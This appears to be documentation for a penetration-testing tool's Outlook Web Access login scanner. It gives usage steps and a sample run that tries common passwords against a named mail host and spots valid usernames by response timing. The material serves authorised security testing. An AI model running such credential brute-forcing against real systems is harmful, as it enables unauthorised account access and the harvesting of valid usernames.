This module tests credentials on OWA 2003, 2007, 2010, 2013, and 2016 servers.

NOTE: This module assumes that login attempts that take a long time (>1 sec) to
return are using a valid domain username. This methodology does not work when
passing a full email address (user@domain.com). Full email addresses will not
be saved as potentially valid usernames unless we get a successful login.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/owa_login```
2. Do: ```set RHOSTS [IP]```
3. Configure a user and password list by setting either `USERNAME`, `PASSWORD`, `USER_FILE`, or `PASS_FILE`.
4. Do: ```run```

## Scenarios

```
msf5 auxiliary(scanner/http/owa_login) > run

[*] webmail.hostingcloudapp.com:443 OWA - Testing version OWA_2013
[+] Found target domain: HOSTINGCLOUDAPP
[*] webmail.hostingcloudapp.com:443 OWA - Trying administrator : password
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.24
[+] server type: EXCH2016MBX02
[*] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.267791 'HOSTINGCLOUDAPP\administrator' : 'password': SAVING TO CREDS
[*] webmail.hostingcloudapp.com:443 OWA - Trying administrator : password1
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.24
[+] server type: EXCH2016MBX02
[*] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.273841 'HOSTINGCLOUDAPP\administrator' : 'password1': SAVING TO CREDS
[*] webmail.hostingcloudapp.com:443 OWA - Trying administrator : fido
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.22
[+] server type: EXCH2016MBX01
[*] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.270796 'HOSTINGCLOUDAPP\administrator' : 'fido': SAVING TO CREDS
[*] webmail.hostingcloudapp.com:443 OWA - Trying johndoe : password
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.22
[+] server type: EXCH2016MBX01
[-] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN. 2.046935 'HOSTINGCLOUDAPP\johndoe' : 'password' (HTTP redirect with reason 2)
[*] webmail.hostingcloudapp.com:443 OWA - Trying johndoe : password1
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.24
[+] server type: EXCH2016MBX02
[-] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN. 2.073391 'HOSTINGCLOUDAPP\johndoe' : 'password1' (HTTP redirect with reason 2)
[*] webmail.hostingcloudapp.com:443 OWA - Trying johndoe : fido
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.24
[+] server type: EXCH2016MBX02
[-] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN. 2.038717 'HOSTINGCLOUDAPP\johndoe' : 'fido' (HTTP redirect with reason 2)
[*] webmail.hostingcloudapp.com:443 OWA - Trying bob : password
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.24
[+] server type: EXCH2016MBX02
[*] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.289186 'HOSTINGCLOUDAPP\bob' : 'password': SAVING TO CREDS
[*] webmail.hostingcloudapp.com:443 OWA - Trying bob : password1
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.24
[+] server type: EXCH2016MBX02
[*] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.270616 'HOSTINGCLOUDAPP\bob' : 'password1': SAVING TO CREDS
[*] webmail.hostingcloudapp.com:443 OWA - Trying bob : fido
[*] webmail.hostingcloudapp.com:443 OWA - Resolved hostname 'webmail.hostingcloudapp.com' to address 38.126.136.24
[+] server type: EXCH2016MBX02
[*] webmail.hostingcloudapp.com:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.275251 'HOSTINGCLOUDAPP\bob' : 'fido': SAVING TO CREDS
[*] Auxiliary module execution completed

```